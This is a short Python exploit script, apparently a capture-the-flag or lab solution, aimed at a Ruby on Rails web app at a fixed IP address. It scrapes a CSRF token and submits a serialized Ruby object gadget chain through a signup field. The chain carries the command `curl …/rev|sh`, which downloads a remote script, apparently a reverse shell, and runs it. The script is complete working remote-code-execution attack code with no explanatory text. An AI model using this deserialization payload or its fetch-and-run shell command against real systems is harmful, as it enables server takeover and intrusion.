#!/usr/bin/env python3

import requests
import urllib.parse

if __name__ == "__main__":
    
    s = requests.Session()
    host = "http://140.113.24.143:3000"

    r = s.get(host + "/users/new")

    authenticity_token = r.text.split('name="authenticity_token" value="')[1].split('"')[0]

    payload = "\x04\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0E@instanceo:?ActiveModel::AttributeMethods::ClassMethods::CodeGenerator\n:\v@ownerm\x10ActiveModel:\n@pathI\"\x00\x06:\x06ET:\n@linei\x00:\r@sources[\x06I\"'`curl 140.113.24.143:9001/rev|sh`\n\x06;\nT:\r@renames{\x00:\f@method:\fexecute:\t@varI\"\r@execute\x06;\nT:\x10@deprecatorIu:\x1FActiveSupport::Deprecation\x00\x06;\nT"


    
    data = {
        "authenticity_token": authenticity_token,
        "id[]": "/notes/l3o",
        "user[username]": "l3o",
        "user[name]": payload
    }

    s.post(host + "/users", data=data)
    r = s.get(host + "/notes/l3o")
    print(r.text)